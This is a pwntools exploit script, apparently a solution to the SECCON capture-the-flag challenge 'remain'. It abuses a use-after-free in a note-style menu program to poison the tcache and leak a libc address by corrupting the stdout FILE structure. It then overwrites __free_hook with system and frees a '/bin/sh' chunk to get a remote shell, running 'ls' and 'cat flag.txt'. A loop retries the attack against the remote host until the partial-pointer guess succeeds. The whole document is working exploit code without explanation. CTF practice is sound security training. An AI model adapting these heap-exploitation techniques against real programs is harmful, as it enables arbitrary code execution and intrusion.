from pwn import *
from time import sleep

def add(content):
    r.sendlineafter("> ", "1")
    r.sendafter("> ", content)

def delete(index):
    r.sendlineafter("> ", "3")
    r.sendlineafter("> ", str(index))

def edit(index, content):
    r.sendlineafter("> ", "2")
    r.sendlineafter("> ", str(index))
    r.sendafter("> ", content)

libc = ELF("./libc.so.6")

def exploit(r):
    add('A'*64) #0
    add('B'*64) #1
    #add('C'*64) #2
    delete(0)
    delete(1)
    edit(1, '\x90\x70')
    add('C') #2
    add('D'*64) #3
    delete(1)
    edit(3, p64(0) + p64(0x251) + p64(0) + '\xa8\x70')
    add('E') #4 <- control
    delete(2)
    edit(4, '\xa0\x70')
    add('F') #5
    delete(2)
    edit(4, '\x50\x70')
    add('\x07'*64) #6
    delete(2)
    delete(5)
    edit(4, '\xa0\x86')
    add(p64(0xfbad1800) + p64(0)*3 + '\0') #7
    leak = r.recvline()
    print leak
    libc_base = u64(leak[8:16]) - 3889536
    log.info('libc: ' + hex(libc_base))
    libc.address = libc_base

    edit(4, '\0'*4)
    delete(2)
    edit(4, p64(libc.symbols['environ'])[0:6])
    add(p64(0)) #8
    edit(4, '\0'*6)
    delete(2)
    edit(4, p64(libc.symbols['__free_hook'])[0:6])
    add(p64(libc.symbols['system'])) #9
    edit(6, '/bin/sh\0')
    delete(6)
    sleep(1)
    r.sendline('ls')
    sleep(1)
    r.sendline('cat flag.txt')

    r.interactive()

#r = process('./remain', env = {'LD_PRELOAD' : './libc.so.6'}, aslr = False)
#exploit(r)

while (True):
    try:
        #r = process('./remain', env = {'LD_PRELOAD' : './libc.so.6'}, aslr = False)
        r = remote('remain.chal.seccon.jp', 27384)
        exploit(r)
    except:
        r.close()
        #sleep(1)

